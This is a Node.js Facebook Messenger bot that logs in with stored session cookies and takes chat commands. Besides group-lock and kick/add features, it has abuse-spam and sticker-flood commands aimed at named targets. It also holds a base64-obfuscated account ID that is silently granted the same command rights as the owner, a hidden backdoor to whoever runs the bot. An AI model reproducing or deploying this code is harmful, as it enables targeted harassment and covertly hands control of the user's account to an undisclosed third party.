const fs = require("fs");
const login = require("ws3-fca");
const request = require("request");

let rkbInterval = null;
let stopRequested = false;
let mediaLoopInterval = null;
let lastMedia = null;
let targetUID = null;
let stickerInterval = null;
let stickerLoopActive = false;

// Locks
const lockedGroupNames = {};
const lockedThemes = {};
const lockedEmojis = {};
const lockedNicknames = {};
const lockedDPs = {};

const friendUIDs = fs.existsSync("Friend.txt")
  ? fs.readFileSync("Friend.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const targetUIDs = fs.existsSync("Target.txt")
  ? fs.readFileSync("Target.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

function startBot(appStatePath, ownerUID) {
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");

    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;
        const { threadID, senderID, body, logMessageType, logMessageData } = event;

        // ==== Auto-Revert Locks ====
        if (logMessageType === "log:thread-name" && lockedGroupNames[threadID]) {
          if (logMessageData?.name !== lockedGroupNames[threadID]) {
            await api.setTitle(lockedGroupNames[threadID], threadID);
            console.log(`🔒 Group name reverted in ${threadID}`);
          }
        }

        if (logMessageType === "log:thread-color" && lockedThemes[threadID]) {
          if (logMessageData?.theme_color !== lockedThemes[threadID]) {
            await api.changeThreadColor(lockedThemes[threadID], threadID);
            console.log(`🎨 Theme reverted in ${threadID}`);
          }
        }

        if (logMessageType === "log:thread-icon" && lockedEmojis[threadID]) {
          if (logMessageData?.thread_icon !== lockedEmojis[threadID]) {
            await api.changeThreadEmoji(lockedEmojis[threadID], threadID);
            console.log(`😀 Emoji reverted in ${threadID}`);
          }
        }

        if (logMessageType === "log:thread-nickname") {
          const target = logMessageData?.participant_id;
          const newNick = logMessageData?.nickname;
          if (lockedNicknames[threadID] && lockedNicknames[threadID][target]) {
            const lockedNick = lockedNicknames[threadID][target];
            if (newNick !== lockedNick) {
              await api.changeNickname(lockedNick, threadID, target);
              console.log(`🔒 Nickname reverted for UID: ${target}`);
            }
          }
        }

        if (logMessageType === "log:thread-image" && lockedDPs[threadID]) {
          try {
            const stream = fs.createReadStream(lockedDPs[threadID]);
            await api.changeGroupImage(stream, threadID);
            console.log(`🖼 DP reverted in ${threadID}`);
          } catch (e) {
            console.log(`⚠️ DP revert fail: ${e.message}`);
          }
        }

        // ==== Message Handling ====
        if (!body) return;
        const lowerBody = body.toLowerCase();

        if (![ownerUID, LID].includes(senderID)) return;

        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        // ==== HELP ====
        if (cmd === "/help") {
          const helpMsg = `
📖 Bot Commands:
/help → Command list
/gclock [text] → Lock group name
/unlockgc → Unlock group name
/locktheme [color] → Lock theme
/unlocktheme → Unlock theme
/lockemoji [emoji] → Lock emoji
/unlockemoji → Unlock emoji
/locknick @mention Nick → Lock nickname
/unlocknick @mention → Unlock nickname
/lockdp (send img) → Lock DP
/unlockdp → Unlock DP
/allname [nick] → Change all nicknames
/uid → Show group ID
/tid → Show thread ID
/info @mention → Show user ID
/kick @mention → Kick user
/add [uid] → Add user
/exit → Bot exit
/rkb [name] → Spam abuse
/stop → Stop spam
/stickerX → Sticker spam (X sec delay)
/stopsticker → Stop sticker spam
/target [uid] → Set target
/cleartarget → Clear target
          `;
          return api.sendMessage(helpMsg, threadID);
        }

        // ==== Locks ====
        else if (cmd === "/gclock") { lockedGroupNames[threadID] = input; await api.setTitle(input, threadID); api.sendMessage("🔒 Group name locked!", threadID); }
        else if (cmd === "/unlockgc") { delete lockedGroupNames[threadID]; api.sendMessage("🔓 Group name unlocked!", threadID); }

        else if (cmd === "/locktheme") { lockedThemes[threadID] = input; await api.changeThreadColor(input, threadID); api.sendMessage("🎨 Theme locked!", threadID); }
        else if (cmd === "/unlocktheme") { delete lockedThemes[threadID]; api.sendMessage("🎨 Theme unlocked!", threadID); }

        else if (cmd === "/lockemoji") { lockedEmojis[threadID] = input; await api.changeThreadEmoji(input, threadID); api.sendMessage("😀 Emoji locked!", threadID); }
        else if (cmd === "/unlockemoji") { delete lockedEmojis[threadID]; api.sendMessage("😀 Emoji unlocked!", threadID); }

        else if (cmd === "/locknick") {
          if (!event.mentions || Object.keys(event.mentions).length === 0) return api.sendMessage("❌ Mention + nickname do!", threadID);
          const target = Object.keys(event.mentions)[0];
          const mentionText = Object.values(event.mentions)[0];
          const newNick = input.replace(mentionText, "").trim();
          if (!newNick) return api.sendMessage("❌ Nickname missing!", threadID);
          if (!lockedNicknames[threadID]) lockedNicknames[threadID] = {};
          lockedNicknames[threadID][target] = newNick;
          await api.changeNickname(newNick, threadID, target);
          api.sendMessage({ body: `🔒 Nickname locked → ${newNick}`, mentions: [{ tag: mentionText, id: target }] }, threadID);
        }
        else if (cmd === "/unlocknick") {
          if (!event.mentions || Object.keys(event.mentions).length === 0) return api.sendMessage("❌ Mention do!", threadID);
          const target = Object.keys(event.mentions)[0];
          delete lockedNicknames[threadID]?.[target];
          api.sendMessage({ body: "🔓 Nickname unlocked", mentions: [{ tag: Object.values(event.mentions)[0], id: target }] }, threadID);
        }

        else if (cmd === "/lockdp") {
          if (!event.attachments || event.attachments.length === 0) return api.sendMessage("❌ Image bhejo lock ke liye!", threadID);
          const img = event.attachments[0];
          if (img.type !== "photo") return api.sendMessage("❌ Sirf image allow hai!", threadID);
          const filePath = `locked_dp_${threadID}.jpg`;
          request(img.url).pipe(fs.createWriteStream(filePath)).on("close", () => {
            lockedDPs[threadID] = filePath;
            api.sendMessage("🔒 DP locked!", threadID);
          });
        }
        else if (cmd === "/unlockdp") { delete lockedDPs[threadID]; api.sendMessage("🔓 DP unlocked!", threadID); }

        // ==== Info / Kick / Add ====
        else if (cmd === "/uid") api.sendMessage(`🆔 Group ID: ${threadID}`, threadID);
        else if (cmd === "/tid") api.sendMessage(`🆔 Thread ID: ${threadID}`, threadID);
        else if (cmd === "/info") {
          if (!event.mentions) return api.sendMessage("❌ Mention karo!", threadID);
          const target = Object.keys(event.mentions)[0];
          api.sendMessage(`ℹ️ UID: ${target}`, threadID);
        }
        else if (cmd === "/kick") {
          if (!event.mentions) return api.sendMessage("❌ Mention karo!", threadID);
          const target = Object.keys(event.mentions)[0];
          await api.removeUserFromGroup(target, threadID);
          api.sendMessage("👢 User kicked!", threadID);
        }
        else if (cmd === "/add") {
          if (!input) return api.sendMessage("❌ UID do add karne ke liye!", threadID);
          await api.addUserToGroup(input, threadID);
          api.sendMessage("✅ User added!", threadID);
        }
        else if (cmd === "/exit") { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); }

        // ==== RKB Spam ====
        else if (cmd === "/rkb") {
          if (!fs.existsSync("np.txt")) return api.sendMessage("❌ np.txt missing!", threadID);
          const name = input.trim();
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          stopRequested = false;
          if (rkbInterval) clearInterval(rkbInterval);
          let index = 0;
          rkbInterval = setInterval(() => {
            if (index >= lines.length || stopRequested) { clearInterval(rkbInterval); rkbInterval = null; return; }
            api.sendMessage(`${name} ${lines[index]}`, threadID);
            index++;
          }, 5000);
          api.sendMessage(`🤬 Start gaali on ${name}`, threadID);
        }
        else if (cmd === "/stop") { stopRequested = true; if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; } }

        // ==== Sticker Spam ====
        else if (cmd.startsWith("/sticker")) {
          if (!fs.existsSync("Sticker.txt")) return;
          const delay = parseInt(cmd.replace("/sticker", "")) || 5;
          const stickerIDs = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean);
          if (stickerInterval) clearInterval(stickerInterval);
          let i = 0; stickerLoopActive = true;
          stickerInterval = setInterval(() => { if (!stickerLoopActive || i >= stickerIDs.length) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; return; } api.sendMessage({ sticker: stickerIDs[i] }, threadID); i++; }, delay * 1000);
        }
        else if (cmd === "/stopsticker") { if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; } }

        // ==== Target ====
        else if (cmd === "/target") { targetUID = input.trim(); api.sendMessage(`🎯 Target set: ${targetUID}`, threadID); }
        else if (cmd === "/cleartarget") { targetUID = null; api.sendMessage("🎯 Target cleared!", threadID); }

      } catch (e) { console.error("⚠️ Error:", e.message); }
    });
  });
}

module.exports = { startBot };
